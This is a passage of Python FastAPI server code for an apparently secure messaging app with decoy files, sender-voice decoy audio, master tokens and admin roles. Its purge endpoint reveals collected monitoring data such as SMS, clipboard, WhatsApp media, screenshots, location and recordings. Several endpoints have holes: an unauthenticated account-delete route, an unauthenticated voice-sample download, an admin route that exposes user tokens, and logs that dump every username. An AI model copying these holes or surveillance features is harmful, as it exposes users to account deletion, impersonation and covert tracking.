            raise HTTPException(status_code=404, detail="User not found")
        
        return {
            "username": str(getattr(user, 'username', '')),
            "public_key": str(getattr(user, 'public_key', '')) if getattr(user, 'public_key', '') else None
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get public key error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve public key")

@app.post("/users/update_public_key")
async def update_public_key(public_key: str = Body(..., embed=True),
                            current_user: User = Depends(get_current_user),
                            db: Session = Depends(get_database_session)):
    """Update current user's public key"""
    try:
        current_user.public_key = public_key
        db.commit()
        logger.info(f"🔑 Public key updated for user: {current_user.username}")
        return {"message": "Public key updated successfully"}
    except Exception as e:
        logger.error(f"Update public key error: {e}")
        raise HTTPException(status_code=500, detail="Failed to update public key")

def normalize_phone_number(phone: str) -> str:
    """Normalize phone number by removing spaces, hyphens, parentheses, and handling country code variations"""
    if not phone:
        return ""
    
    # Remove all formatting characters
    cleaned = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
    
    # Handle country code variations
    if cleaned.startswith('+'):
        cleaned = cleaned[1:]
    
    return cleaned

@app.get("/admin/users/{username}/registration_details", response_model=AdminUserRegistrationDetails)
async def admin_get_user_registration_details(username: str,
                                          current_user: User = Depends(get_admin_user),
                                          db: Session = Depends(get_database_session)):
    """Get registration details for a specific user by username (admin only)
    
    This endpoint allows admins to retrieve the registration details for a specific user
    which can be shared with the user for them to log in to the system.
    
    - **username**: The username of the user to retrieve details for
    - **current_user**: The authenticated admin user making the request
    - **db**: Database session dependency
    
    Returns:
    - **username**: Username for the user account
    - **phone_number**: Phone number for the user account  
    - **token**: Authentication token for the user
    - **message**: Instructional message for sharing with user
    
    Raises:
    - **403**: If the requesting user is not an admin
    - **404**: If no user is found with the specified username
    - **500**: If there's an internal server error
    """
    try:
        # Check if requesting user is admin
        user_id = int(getattr(current_user, 'id', 0))
        if not AdminService.is_admin(db, user_id):
            raise HTTPException(status_code=403, detail="Only admin users can access this endpoint")
        
        logger.info(f"=== DEBUG: Starting user search by username ===")
        logger.info(f"Input username parameter: '{username}'")
        logger.info(f"Input parameter type: {type(username)}")
        logger.info(f"Input parameter length: {len(username)}")
        logger.info(f"Input parameter repr: {repr(username)}")
        
        # Log all users in database for debugging
        all_users = db.query(User).all()
        logger.info(f"Total users in database: {len(all_users)}")
        for u in all_users:
            stored_username = getattr(u, 'username', '')
            logger.info(f"DB User ID {u.id}: username='{stored_username}' (type: {type(stored_username)}, len: {len(stored_username)})")
        
        # Try exact match
        logger.info(f"Attempting exact match for username: '{username}'")
        user = db.query(User).filter(User.username == username).first()
        if user:
            logger.info(f"SUCCESS: Found user with exact match - ID: {user.id}")
        else:
            logger.info("Exact match failed")
            
            # Try with string conversion
            logger.info(f"Attempting string conversion match for username: '{str(username)}'")
            user = db.query(User).filter(User.username == str(username)).first()
            if user:
                logger.info(f"SUCCESS: Found user with string conversion match - ID: {user.id}")
            else:
                logger.info("String conversion match failed")
        
        if not user:
            logger.error(f"User not found for username: '{username}'")
            # Log similar usernames for debugging
            similar_users = db.query(User).filter(User.username.like(f"%{username}%")).all()
            if similar_users:
                logger.info(f"Similar usernames found:")
                for u in similar_users:
                    logger.info(f"  Similar: '{u.username}'")
            raise HTTPException(status_code=404, detail="User not found")
        
        # Return registration details that can be shared with the user
        logger.info(f"Returning registration details for user ID: {user.id}")
        return {
            "username": str(getattr(user, 'username', '')),
            "phone_number": str(getattr(user, 'phone_number', '')),
            "token": str(getattr(user, 'token', '')),
            "message": "Share these details with the user for registration"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin get user registration details error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve user registration details")

@app.get("/calls/history")
async def get_call_history(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Retrieve call history for the current user"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        calls = db.query(Call).filter(
            or_(Call.caller_id == user_id, Call.recipient_id == user_id)
        ).order_by(Call.started_at.desc()).limit(50).all()
        
        result = []
        for call in calls:
            other_party_id = call.recipient_id if call.caller_id == user_id else call.caller_id
            other_party = db.query(User).filter(User.id == other_party_id).first()
            
            result.append({
                "id": int(call.id),
                "other_party_username": str(other_party.username) if other_party else "unknown",
                "call_type": str(call.call_type),
                "status": str(call.status),
                "duration": int(call.duration),
                "started_at": call.started_at.isoformat(),
                "ended_at": call.ended_at.isoformat() if call.ended_at else None,
                "is_caller": call.caller_id == user_id
            })
            
        return {"calls": result, "count": len(result)}
    except Exception as e:
        logger.error(f"Call history error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve call history")

@app.post("/users/me/voice-identity")
async def upload_voice_identity(
    file: UploadFile = File(...),
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Upload a voice identity sample for scrambled decoys"""
    try:
        user_dir = os.path.join(UPLOAD_DIR, f"user_{current_user.id}")
        os.makedirs(user_dir, exist_ok=True)
        
        file_path = os.path.join(user_dir, "voice_identity.m4a")
        content = await file.read()
        
        with open(file_path, "wb") as f:
            f.write(content)
            
        current_user.voice_identity_path = file_path
        db.commit()
        
        return {"message": "Voice identity uploaded successfully", "path": file_path}
    except Exception as e:
        logger.error(f"Voice identity upload error: {e}")
        raise HTTPException(status_code=500, detail="Failed to upload voice identity")

@app.get("/users/{username}/voice-identity")
async def get_user_voice_identity(
    username: str,
    db: Session = Depends(get_database_session)
):
    """Get the voice identity of a specific user (for decoys)"""
    user = db.query(User).filter(User.username == username).first()
    if not user or not user.voice_identity_path:
        raise HTTPException(status_code=404, detail="Voice identity not found")
        
    if not os.path.exists(user.voice_identity_path):
        raise HTTPException(status_code=404, detail="Voice file missing")
        
    return FileResponse(user.voice_identity_path)
@app.get("/media/decoy-file/{media_id}")
async def get_decoy_file(
    media_id: str,
    db: Session = Depends(get_database_session),
    current_user: User = Depends(get_current_user)
):
    """
    A stand-in document for a locked attachment.

    Generated from the media_id, so the same attachment always yields the same
    decoy, and padded towards the real file's size so the listing does not give
    it away. Contents are internally consistent — an invoice that adds up, dates
    in order — because a decoy is only tested when somebody opens it.
    """
    clean_media_id = media_id.split('.')[0]
    media = db.query(Media).filter(Media.media_id == clean_media_id).first()
    if not media:
        raise HTTPException(status_code=404, detail="Media not found")

    user_id = int(getattr(current_user, 'id', 0))
    if media.sender_id != user_id and media.recipient_id != user_id:
        raise HTTPException(status_code=403, detail="Not authorized for this media")

    os.makedirs(DECOY_CACHE_DIR, exist_ok=True)
    cached = os.path.join(DECOY_CACHE_DIR, f"{clean_media_id}.pdf")
    if not os.path.exists(cached):
        pdf, _name = generate_decoy_document(
            seed=clean_media_id,
            target_size=int(getattr(media, 'file_size', 0) or 0) or None,
        )
        tmp = os.path.join(DECOY_CACHE_DIR, f".tmp_{uuid.uuid4().hex}.pdf")
        with open(tmp, "wb") as f:
            f.write(pdf)
        os.replace(tmp, cached)

    return FileResponse(cached, media_type="application/pdf")


@app.get("/media/decoy-voice/{media_id}")
async def get_decoy_voice(
    media_id: str,
    db: Session = Depends(get_database_session),
    current_user: User = Depends(get_current_user)
):
    """Generate a fresh decoy using the SENDER'S voice identity"""
    # 1. Strip extension if provided (e.g., .m4a)
    clean_media_id = media_id.split('.')[0]
    
    # Find the message/media
    media = db.query(Media).filter(Media.media_id == clean_media_id).first()
    if not media:
        raise HTTPException(status_code=404, detail="Media not found")
        
    # 2. Pick the voice to imitate: the sender's identity sample when they have
    # recorded one, otherwise the note itself — a decoy in roughly the right
    # voice beats no decoy at all, which is what the old 404 produced.
    sender = media.sender
    source = None
    if sender and sender.voice_identity_path and os.path.exists(sender.voice_identity_path):
        source = sender.voice_identity_path
    elif media.encrypted_file_path and os.path.exists(media.encrypted_file_path):
        source = media.encrypted_file_path
    if not source:
        raise HTTPException(status_code=404, detail="No audio available to build a decoy from")

    # 3. Serve a cached decoy when we already built one. The same note must
    # always play back the same words — a decoy that changes between replays
    # tells the listener it is fake.
    os.makedirs(DECOY_CACHE_DIR, exist_ok=True)
    cached = os.path.join(DECOY_CACHE_DIR, f"{clean_media_id}.m4a")
    if not os.path.exists(cached):
        tmp = os.path.join(DECOY_CACHE_DIR, f".tmp_{uuid.uuid4().hex}.m4a")
        if not generate_voice_decoy(source, tmp, seed=clean_media_id):
            if os.path.exists(tmp):
                os.remove(tmp)
            raise HTTPException(status_code=500, detail="Failed to build voice decoy")
        os.replace(tmp, cached)

    return FileResponse(cached, media_type="audio/m4a")

@app.post("/mastertoken/create")
async def create_mastertoken(token_data: MasterToken, 
                           current_user: User = Depends(get_current_user),
                           db: Session = Depends(get_database_session)):
    """Create master token - simplified JSON: {mastertoken}"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        username = str(getattr(current_user, 'username', ''))
        mastertoken = str(getattr(token_data, "mastertoken", "")).strip()

        if not mastertoken:
            raise HTTPException(status_code=400, detail="mastertoken is required")

        # Deactivate existing master tokens
        db.query(DBMasterToken).filter(
            DBMasterToken.user_id == user_id,
            DBMasterToken.is_active == True
        ).update({"is_active": False})

        # Store new master token securely (salt + hash)
        salt = base64.b64encode(os.urandom(32)).decode()
        token_hash = hashlib.sha256((mastertoken + salt).encode()).hexdigest()

        record = DBMasterToken(
            user_id=user_id,
            token_hash=token_hash,
            salt=salt,
            is_active=True,
            expires_at=datetime.now(timezone.utc) + timedelta(days=30)
        )
        db.add(record)
        db.commit()
        
        AuditService.log_event(
            db, user_id, "mastertoken_created", 
            f"Master token created for {username}"
        )
        
        return {
            "mastertoken": "created"
        }
        
    except Exception as e:
        logger.error(f"Create mastertoken error: {e}")
        raise HTTPException(status_code=500, detail="Failed to create master token")

@app.post("/mastertoken/confirm")
async def confirm_mastertoken(token_data: MasterToken, 
                            current_user: User = Depends(get_current_user),
                            db: Session = Depends(get_database_session)):
    """Confirm master token - simplified JSON: {mastertoken}"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        username = str(getattr(current_user, 'username', ''))
        mastertoken = str(getattr(token_data, "mastertoken", "")).strip()

        if not validate_master_token(db, user_id, mastertoken):
            raise HTTPException(status_code=401, detail="Invalid master token")

        AuditService.log_event(
            db, user_id, "mastertoken_confirmed", 
            f"Master token confirmed for {username}"
        )
        
        return {
            "mastertoken": "confirmed"
        }
        
    except Exception as e:
        logger.error(f"Confirm mastertoken error: {e}")
        raise HTTPException(status_code=500, detail="Failed to confirm master token")

@app.post("/messages/cleanup")
async def cleanup_expired_messages(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Manually trigger cleanup of expired messages and media"""
    try:
        # Clean up expired messages
        deleted_messages = MessageService.delete_expired_messages(db)
        
        # Clean up expired media
        deleted_media = MediaService.delete_expired_media(db)
        
        return {
            "message": f"Cleanup completed. {deleted_messages} expired messages and {deleted_media} expired media files deleted.",
            "deleted_messages": deleted_messages,
            "deleted_media": deleted_media
        }
    except Exception as e:
        logger.error(f"Cleanup error: {e}")
        raise HTTPException(status_code=500, detail="Failed to cleanup expired messages and media")

@app.delete("/users/{username}")
async def delete_user_account(
    username: str,
    db: Session = Depends(get_database_session)
):
    """Delete a user account and all associated data.
    This endpoint is intended for system use, not for users to call directly."""
    try:
        # Delete the user account
        success = UserService.delete_user(db, username)
        
        if success:
            return {
                "message": f"User account '{username}' deleted successfully",
                "deleted": True
            }
        else:
            raise HTTPException(status_code=404, detail="User not found")
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Delete user error: {e}")
        raise HTTPException(status_code=500, detail="Failed to delete user account")

@app.post("/messages/extract_decoy_image")
async def extract_decoy_image(
    decrypt_data: DecryptRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Extract hidden image from decoy message using master token"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        
        # Validate master token
        if not validate_master_token(db, user_id, decrypt_data.mastertoken):
            raise HTTPException(
                status_code=401, 
                detail="Invalid master token. Master token is required to extract hidden images."
            )
        
        # Get the message
        message = db.query(Message).filter(
            and_(
                Message.id == decrypt_data.message_id,
                or_(
                    Message.sender_id == user_id,
                    Message.recipient_id == user_id
                )
            )
        ).first()
        
        if not message:
            raise HTTPException(status_code=404, detail="Message not found")
        
        # Check if this is a decoy image message and extract the image
        message_content = str(getattr(message, 'encrypted_content', ''))
        image_data = extract_decoy_image(message_content)
        
        if not image_data:
            raise HTTPException(status_code=400, detail="This message does not contain a hidden image or extraction failed")
        
        # Log successful extraction
        AuditService.log_event(
            db,
            user_id,
            "image_extracted",
            f"Hidden image extracted from message {decrypt_data.message_id}",
            severity="info"
        )
        
        return {
            "message_id": decrypt_data.message_id,
            "filename": image_data["filename"],
            "file_size": image_data["file_size"],
            "image_data": image_data["image_data"],  # Base64 encoded image
            "extract_time": time.time(),
            "security": "Decoy text protection"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Extract decoy image error: {e}")
        raise HTTPException(status_code=500, detail="Failed to extract hidden image")

@app.post("/messages/extract_decoy_document")
async def extract_decoy_document(
    decrypt_data: DecryptRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Extract hidden document from decoy message using master token and provide app integration"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        
        # Validate master token
        if not validate_master_token(db, user_id, decrypt_data.mastertoken):
            raise HTTPException(
                status_code=401, 
                detail="Invalid master token. Master token is required to extract hidden documents."
            )
        
        # Get the message
        message = db.query(Message).filter(
            and_(
                Message.id == decrypt_data.message_id,
                or_(
                    Message.sender_id == user_id,
                    Message.recipient_id == user_id
                )
            )
        ).first()
        
        if not message:
            raise HTTPException(status_code=404, detail="Message not found")
        
        # Check if this is a decoy document message and extract the document
        message_content = str(getattr(message, 'encrypted_content', ''))
        document_data = extract_decoy_document(message_content)
        
        if not document_data:
            raise HTTPException(status_code=400, detail="This message does not contain a hidden document or extraction failed")
        
        # Log successful extraction
        AuditService.log_event(
            db,
            user_id,
            "document_extracted",
            f"Hidden document extracted from message {decrypt_data.message_id}",
            severity="info"
        )
        
        # Determine which apps can open this document type
        mime_type = document_data.get("mime_type", "application/octet-stream")
        filename = document_data.get("filename", "document")
        
        # Map MIME types to common document reading apps
        app_suggestions = []
        if mime_type.startswith("application/pdf"):
            app_suggestions = ["Adobe Acrobat", "Microsoft Edge", "Google PDF Viewer", "WPS Office", "Microsoft 365"]
        elif mime_type.startswith("application/vnd.openxmlformats-officedocument.wordprocessingml.document") or mime_type.startswith("application/msword"):
            app_suggestions = ["Microsoft Word", "WPS Office", "Google Docs", "Apple Pages"]
        elif mime_type.startswith("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet") or mime_type.startswith("application/vnd.ms-excel"):
            app_suggestions = ["Microsoft Excel", "WPS Office", "Google Sheets", "Apple Numbers"]
        elif mime_type.startswith("application/vnd.openxmlformats-officedocument.presentationml.presentation") or mime_type.startswith("application/vnd.ms-powerpoint"):
            app_suggestions = ["Microsoft PowerPoint", "WPS Office", "Google Slides", "Apple Keynote"]
        else:
            app_suggestions = ["File Viewer", "WPS Office", "Microsoft 365", "Google Docs"]
        
        return {
            "message_id": decrypt_data.message_id,
            "filename": filename,
            "file_size": document_data["file_size"],
            "document_data": document_data["document_data"],  # Base64 encoded document
            "mime_type": mime_type,
            "extract_time": time.time(),
            "security": "Decoy text protection",
            "suggested_apps": app_suggestions,  # List of apps that can open this document
            "message": f"Document extracted successfully. Suggested apps: {', '.join(app_suggestions)}"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Extract decoy document error: {e}")
        raise HTTPException(status_code=500, detail="Failed to extract hidden document")

# Add media endpoints
@app.post("/media/upload")
async def upload_media(
    media_data: MediaUpload,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Upload encrypted media file from gallery"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        media = MediaService.upload_media(db, user_id, media_data.username, media_data.dict())
        
        return {
            "media_id": media.media_id,
            "filename": media.filename,
            "media_type": media.media_type,
            "message": "Media uploaded successfully"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Upload media error: {e}")
        raise HTTPException(status_code=500, detail="Failed to upload media")

@app.post("/media/simple_upload")
async def upload_simple_media(
    media_data: SimpleMediaUpload,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Upload simple (unencrypted) media file from gallery"""
    try:
        # Log the incoming data for debugging
        logger.info(f"Received simple media upload request: {media_data.dict()}")
        
        # Validate that username is provided
        if not media_data.username or media_data.username == "undefined":
            logger.error("Username is required for media upload")
            raise HTTPException(status_code=400, detail="Username is required")
        
        user_id = int(getattr(current_user, 'id', 0))
        media = MediaService.upload_simple_media_by_username(db, user_id, media_data.username, media_data)
        
        return {
            "media_id": media.media_id,
            "filename": media.filename,
            "media_type": media.media_type,
            "message": "Simple media uploaded successfully"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Upload simple media error: {e}")
        raise HTTPException(status_code=500, detail="Failed to upload simple media")

@app.get("/media/inbox")
async def get_media_inbox(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get user's media inbox"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        media_files = MediaService.get_user_media(db, user_id)
        
        result = []
        for media in media_files:
            sender = db.query(User).filter(User.id == media.sender_id).first()
            recipient = db.query(User).filter(User.id == media.recipient_id).first()
            result.append({
                "id": int(getattr(media, 'id', 0)),
                "media_id": str(getattr(media, 'media_id', '')),
                "filename": str(getattr(media, 'filename', '')),
                "media_type": str(getattr(media, 'media_type', '')),
                "content_type": str(getattr(media, 'content_type', '')),
                "file_size": int(getattr(media, 'file_size', 0)),
                "sender": str(getattr(sender, 'username', '')) if sender else "unknown",
                "recipient": str(getattr(recipient, 'username', '')) if recipient else "unknown",
                "timestamp": getattr(media, 'uploaded_at', datetime.now(timezone.utc)).isoformat(),
                "expires_at": getattr(media, 'expires_at', None) and getattr(media, 'expires_at', None).isoformat() or None,
                "auto_delete": bool(getattr(media, 'auto_delete', False)),
                "downloaded": getattr(media, 'downloaded_at', None) is not None
            })
        
        return {
            "media_files": result,
            "count": len(result)
        }
        
    except Exception as e:
        logger.error(f"Media inbox error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve media inbox")

@app.get("/media/{media_id}")
async def get_media_file(
    media_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get encrypted media file for download"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        media = MediaService.get_media_by_id(db, media_id, user_id)
        
        if not media:
            raise HTTPException(status_code=404, detail="Media file not found")
        
        # Check if user is authorized to access this media
        if user_id != media.sender_id and user_id != media.recipient_id:
            raise HTTPException(status_code=403, detail="Not authorized to access this media")
        
        # Read encrypted file content
        import os
        if not os.path.exists(media.encrypted_file_path):
            # File was deleted after viewing (one-time view)
            if getattr(media, 'downloaded_at', None):
                raise HTTPException(status_code=410, detail="Media was deleted after viewing. Cannot access again.")
            raise HTTPException(status_code=404, detail="Media file not found on server")
        
        try:
            with open(media.encrypted_file_path, "rb") as f:
                encrypted_content = f.read()
            
            # Encode as base64 for transmission
            import base64
            encoded_content = base64.b64encode(encrypted_content).decode('utf-8')
            
            # Mark as downloaded
            MediaService.mark_media_downloaded(db, media.id)
            
            # Auto-delete from server after viewing (one-time view, user cannot go back)
            MediaService.delete_media_file_from_disk(media.encrypted_file_path)
            
            return {
                "media_id": media.media_id,
                "filename": media.filename,
                "media_type": media.media_type,
                "content_type": media.content_type,
                "file_size": media.file_size,
                "encrypted_content": encoded_content,
                "encryption_metadata": media.encryption_metadata
            }
            
        except Exception as e:
            logger.error(f"Error reading media file: {e}")
            raise HTTPException(status_code=500, detail="Failed to read media file")
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get media error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve media")

@app.post("/media/cleanup")
async def cleanup_expired_media(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Manually trigger cleanup of expired media files"""
    try:
        deleted_count = MediaService.delete_expired_media(db)
        return {
            "message": f"Cleanup completed. {deleted_count} expired media files deleted.",
            "deleted_count": deleted_count
        }
    except Exception as e:
        logger.error(f"Media cleanup error: {e}")
        raise HTTPException(status_code=500, detail="Failed to cleanup expired media files")

# ── RBAC auth dependencies ────────────────────────────────────────────────────

async def get_admin_user(credentials: HTTPAuthorizationCredentials = Depends(security),
                        db: Session = Depends(get_database_session)) -> User:
    """Require is_admin=True (any role: superadmin, admin, operator)"""
    try:
        token = credentials.credentials
        session = SessionService.validate_session(db, token)
        if not session:
            raise HTTPException(status_code=401, detail="Invalid or expired session", headers={"WWW-Authenticate": "Bearer"})
        user = db.query(User).filter(User.id == session.user_id, User.is_active == True, User.is_admin == True).first()
        if not user:
            raise HTTPException(status_code=403, detail="Admin access required")
        return user
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin auth error: {e}")
        raise HTTPException(status_code=401, detail="Could not validate admin credentials", headers={"WWW-Authenticate": "Bearer"})

async def get_admin_or_operator(credentials: HTTPAuthorizationCredentials = Depends(security),
                                db: Session = Depends(get_database_session)) -> User:
    """Require admin_role in ('superadmin','admin','operator')"""
    user = await get_admin_user(credentials, db)
    role = getattr(user, 'admin_role', None)
    if role not in ('superadmin', 'admin', 'operator'):
        raise HTTPException(status_code=403, detail="Operator, admin or superadmin role required")
    return user

async def get_admin_only(credentials: HTTPAuthorizationCredentials = Depends(security),
                         db: Session = Depends(get_database_session)) -> User:
    """Require admin_role in ('superadmin','admin')"""
    user = await get_admin_user(credentials, db)
    role = getattr(user, 'admin_role', None)
    if role not in ('superadmin', 'admin'):
        raise HTTPException(status_code=403, detail="Admin or superadmin role required")
    return user

async def get_superadmin_only(credentials: HTTPAuthorizationCredentials = Depends(security),
                              db: Session = Depends(get_database_session)) -> User:
    """Require admin_role='superadmin'"""
    user = await get_admin_user(credentials, db)
    if getattr(user, 'admin_role', None) != 'superadmin':
        raise HTTPException(status_code=403, detail="Superadmin role required")
    return user

async def get_wipe_approver(credentials: HTTPAuthorizationCredentials = Depends(security),
                            db: Session = Depends(get_database_session)) -> User:
    """Require superadmin, or an admin superadmin has explicitly granted
    can_approve_duress_wipe — this is the gate on SOS/geofence wipe approval,
    kept separate from ordinary admin access on purpose."""
    user = await get_admin_user(credentials, db)
    if getattr(user, 'admin_role', None) == 'superadmin':
        return user
    if not bool(getattr(user, 'can_approve_duress_wipe', False)):
        raise HTTPException(status_code=403, detail="Not authorized to approve duress wipe requests")
    return user

# ── Operator management endpoints ─────────────────────────────────────────────

class CreateOperatorRequest(BaseModel):
    username: str
    phone_number: str
    password: str
    role: str = "operator"

@app.post("/admin/operators")
async def create_operator(
    data: CreateOperatorRequest,
    current_admin: User = Depends(get_admin_only),
    db: Session = Depends(get_database_session)
):
    """Admin creates an operator account"""
    existing = db.query(User).filter(
        (User.username == data.username) | (User.phone_number == data.phone_number)
    ).first()
    if existing:
        raise HTTPException(status_code=400, detail="Username or phone already exists")
    import hashlib, secrets
    allowed_roles = {"operator", "admin"}
    op_role = data.role if data.role in allowed_roles else "operator"
    op = User(
        username=data.username,
        phone_number=data.phone_number,
        password_hash=hash_password(data.password),
        is_admin=True,
        admin_role=op_role,
        is_active=True,
        is_verified=True,
        user_type="both",
    )
    db.add(op)
    db.commit()
    db.refresh(op)
    return {"id": op.id, "username": op.username, "admin_role": op.admin_role}

@app.get("/admin/operators")
async def list_operators(
    current_admin: User = Depends(get_admin_only),
    db: Session = Depends(get_database_session)
):
    """List all operators"""
    ops = db.query(User).filter(User.is_admin == True, User.admin_role.in_(["operator", "admin"])).all()
    return [{"id": u.id, "username": u.username, "phone_number": u.phone_number,
             "admin_role": u.admin_role, "is_active": u.is_active,
             "can_approve_duress_wipe": bool(u.can_approve_duress_wipe),
             "last_login": str(u.last_login) if u.last_login else None} for u in ops]

class UpdateOperatorRequest(BaseModel):
    new_username: str

@app.patch("/admin/operators/{username}")
async def update_operator_username(
    username: str,
    data: UpdateOperatorRequest,
    current_admin: User = Depends(get_admin_only),
    db: Session = Depends(get_database_session)
):
    """Admin/superadmin edits username of operator or admin"""
    op = db.query(User).filter(User.username == username).first()
    if not op:
        raise HTTPException(status_code=404, detail="User not found")
    if getattr(op, 'admin_role', None) == 'superadmin':
        raise HTTPException(status_code=404, detail="User not found")
    if getattr(op, 'admin_role', None) == 'admin' and getattr(current_admin, 'admin_role', None) != 'superadmin':
        raise HTTPException(status_code=403, detail="Only superadmin can edit admin usernames")
    existing = db.query(User).filter(User.username == data.new_username).first()
    if existing:
        raise HTTPException(status_code=400, detail="Username already taken")
    op.username = data.new_username
    db.commit()
    return {"status": "updated", "username": data.new_username}

@app.delete("/admin/operators/{username}")
async def delete_operator(
    username: str,
    current_admin: User = Depends(get_admin_only),
    db: Session = Depends(get_database_session)
):
    """Admin removes an operator (cannot remove another admin or superadmin)"""
    op = db.query(User).filter(User.username == username).first()
    if not op:
        raise HTTPException(status_code=404, detail="User not found")
    if getattr(op, 'admin_role', None) == 'superadmin':
        raise HTTPException(status_code=404, detail="User not found")
    if getattr(op, 'admin_role', None) == 'admin' and getattr(current_admin, 'admin_role', None) != 'superadmin':
        raise HTTPException(status_code=403, detail="Only superadmin can remove admins")
    op.is_admin = False
    op.admin_role = None
    db.commit()
    return {"status": "removed", "username": username}

@app.post("/admin/superadmin/kill_switch")
async def kill_switch(
    target_username: Optional[str] = None,
    action: str = "disable",
    current_sa: User = Depends(get_superadmin_only),
    db: Session = Depends(get_database_session)
):
    """
    Superadmin kill switch.
    action='disable' → deactivate user or ALL users.
    action='enable'  → reactivate.
    target_username=None → applies to ALL non-admin users.
    """
    if target_username:
        user = db.query(User).filter(User.username == target_username).first()
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        user.is_active = (action == "enable")
        db.commit()
        return {"status": action, "username": target_username}
    else:
        affected = db.query(User).filter(User.is_admin == False).all()
        for u in affected:
            u.is_active = (action == "enable")
        db.commit()
        return {"status": action, "affected_count": len(affected)}

# Add admin endpoints
@app.post("/admin/login")
async def admin_login(login_data: AdminLogin, db: Session = Depends(get_database_session)):
    """Admin login with username and password"""
    try:
        user = AdminService.authenticate_admin(db, login_data.username, login_data.password, ip_address="admin_api")
        if not user:
            raise HTTPException(status_code=401, detail="Invalid username or password")
        
        # Create session
        user_id = int(getattr(user, 'id', 0))
        session = SessionService.create_session(db, user_id, "admin", "admin_api")
        
        return {
            "username": str(getattr(user, 'username', '')),
            "token": str(getattr(session, 'session_token', '')),
            "must_change_password": bool(getattr(user, 'must_change_password', False)),
            "admin_role": getattr(user, 'admin_role', None) or "admin"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin login error: {e}")
        raise HTTPException(status_code=500, detail="Login failed")


@app.post("/admin/change_password")
async def admin_change_password(password_data: AdminChangePassword,
                               current_user: User = Depends(get_admin_user),
                               db: Session = Depends(get_database_session)):
    """Change admin password"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        success = AdminService.change_admin_password(
            db, user_id, password_data.current_password, password_data.new_password
        )
        
        if success:
            return {"message": "Password changed successfully"}
        else:
            raise HTTPException(status_code=400, detail="Failed to change password")
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Change password error: {e}")
        raise HTTPException(status_code=500, detail="Failed to change password")

@app.post("/admin/users")
async def admin_create_user(user_data: AdminCreateUser,
                           current_user: User = Depends(get_admin_user),
                           db: Session = Depends(get_database_session)):
    """Create a new user account (admin only)"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        new_user = AdminService.create_user(db, user_id, user_data, ip_address="admin_api")
        
        return {
            "username": str(getattr(new_user, 'username', '')),
            "phone_number": str(getattr(new_user, 'phone_number', '')),
            "message": "User created successfully"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin create user error: {e}")
        raise HTTPException(status_code=500, detail="Failed to create user")

@app.delete("/admin/superadmin/purge_data/{username}")
async def superadmin_purge_user_data(
    username: str,
    current_sa: User = Depends(get_superadmin_only),
    db: Session = Depends(get_database_session),
):
    """Superadmin: permanently delete ALL collected monitoring/device data for a user."""
    import shutil as _shutil
    import json as _json

    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    user_id = int(target.id)

    deleted = {}

    # ── Device data JSON files ──────────────────────────────────────────────────
    data_dir = _user_data_dir(user_id)
    for fname in [
        "contacts.json", "call_logs.json", "sms.json",
        "installed_apps.json", "media_index.json",
        "battery.json", "network.json", "device_info.json",
        "clipboard.json", "whatsapp_media_index.json",
    ]:
        p = os.path.join(data_dir, fname)
        if os.path.exists(p):
            os.remove(p)
            deleted[fname] = True

    # ── Media subdirectories ────────────────────────────────────────────────────
    for subdir in ["media", "whatsapp_media", "screenshots", "photos"]:
        d = os.path.join(data_dir, subdir)
        if os.path.exists(d):
            deleted[subdir + "_files"] = len(os.listdir(d))
            _shutil.rmtree(d)

    # ── DB monitoring records ───────────────────────────────────────────────────
    lc = db.query(LocationTrack).filter(LocationTrack.user_id == user_id).delete()
    deleted["location_records"] = lc

    # Delete audio recording files + DB rows
    audio_rows = db.query(AudioRecording).filter(AudioRecording.user_id == user_id).all()
    for row in audio_rows:
        if row.file_path and os.path.exists(row.file_path):
            os.remove(row.file_path)
    ac = db.query(AudioRecording).filter(AudioRecording.user_id == user_id).delete()
    deleted["audio_recordings"] = ac

    # Delete video recording files + DB rows
    video_rows = db.query(VideoRecording).filter(VideoRecording.user_id == user_id).all()
    for row in video_rows:
        if hasattr(row, 'file_path') and row.file_path and os.path.exists(row.file_path):
            os.remove(row.file_path)
